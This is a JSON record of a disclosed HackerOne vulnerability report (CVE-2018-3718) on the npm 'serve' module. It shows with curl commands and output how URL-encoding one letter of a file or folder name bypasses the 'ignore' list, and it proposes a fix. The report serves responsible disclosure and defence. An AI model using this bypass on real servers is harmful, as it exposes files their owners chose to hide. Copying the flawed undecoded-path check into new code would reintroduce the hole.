@@ -1,0 +1,138 @@
+{
+  "id": 308721,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDg3MjE=",
+  "url": "https://hackerone.com/reports/308721",
+  "title": "[serve] Directory listing and File access even when they have been set to be ignored.",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-01-24T19:02:23.144Z",
+  "submitted_at": "2018-01-24T19:02:23.144Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "0xchr00t",
+    "url": "/0xchr00t",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/217/909/43c8a6397f248fe6fe154bc7213006bae3292ba9_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3718"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-03-13T06:53:14.242Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-03-13T06:53:14.126Z",
+  "team_member_agreed_on_going_public_at": "2018-03-12T13:35:58.228Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Module:** \n- **Name**: `serve`\n- **Version**: latest (`6.4.9`)\n- **Link**: https://www.npmjs.com/package/serve\n\n**Description:**\nThe `serve` modules allows directory browsing and to serve static files through the browser.\nThe config option `ignore` can be used to tell the module which file or directory are forbidden and should not be served. \nThis rule can be bypassed by url encoding the name of the file or directory that has been forbidden. \n\n## Reproduction Steps:\n- Install `serve`\n- Create an application that uses serve for file serving listing and set a few folders and files in the `ignore` config.\n\n```javascript\nconst serve = require('serve')\nconst server = serve(__dirname, {\n\t  port: 1337,\n\t  ignore: ['testfolder', 'test.txt']\n})\n```\n- Run the app\n\n```bash\n$ node filename.js\n```\n- Now, current directory will be served by `serve` with the exception of folder `testfolder` and file `test.txt`\n- If we try to curl `test.txt` we get a `Not Found` error\n\n```bash\n$ curl http://localhost:1337/test.txt\nNot Found\n```\n- The url encoded value for `e` is `%65`. So after replacing an `e` with its url encoded form, we are able to access the file.\n\n```bash\n$ curl http://localhost:1337/t%65st.txt\nthis is a forbidden file :D\n```\n- Additionally, curling the directory `testfolder` returns a 404 too.\n\n```bash\n$ curl http://localhost:1337/testfolder/\nNot Found\n```\n- Applying the same strategy as above, we are able to get a listing of all the files and folders inside the restricted directory.\n\n```html\n$ curl http://localhost:1337/t%65stfolder/\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Files within testserve/testfolder/</title>\n      .\n      .\n          <li>\n            <a href=\"/testfolder/testfile.txt\" title=\"testfile.txt\" class=\"txt\">testfile.txt</a>\n            <i>31 B</i>\n          </li>\n      .\n      .\n```\n- And then we can further access the files inside the forbidden folder using same strategy.\n\n```bash\n$ curl http://localhost:1337/t%65stfolder/testfile.txt\nthis is a test ... forbidden !\n```\n\n\n## Mitigation Strategy\nFrom what I could gather, this is happening because the path variable that is being checked against the user created forbidden folders blacklist, is essentially different from the one which is being used to serve the file/folder. \nNote these particular lines in file `/lib/server.js`-\n\n```javascript\n90  const ignored = !ignoredFiles.every(item => {\n91    return !pathname.includes(item)\n92  })\n```\nLine `91` handles the logic for checking if one of the ignored folder/file names is present in the current requested path. Note that here, the variable `pathname` is used. This variable is not url decoded, while the variable which is used to actually serve the file is named `related` and is url decoded by passing requested path through `decodeURIComponent` function.\nSo one strategy would be to use the `related` variable for checking against the blacklist too.\n\n## Impact\n\nThe issue essentially bypasses the `ignore files/folders` feature and allows an attacker to read from a directory/file that the victim has not allowed access to.",
+  "weakness": {
+    "id": 89,
+    "name": "Information Exposure Through Directory Listing"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-04-11T13:35:58.327Z",
+  "allow_singular_disclosure_after": -254886547.3526267,
+  "singular_disclosure_allowed": true,
+  "vote_count": 15,
+  "voters": [
+    "muon4",
+    "riramar",
+    "bl4de",
+    "tungpun",
+    "whitesector",
+    "eveeez",
+    "kieran",
+    "yasar",
+    "x1m",
+    "0xchr00t",
+    "and 5 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5006,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "serve",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
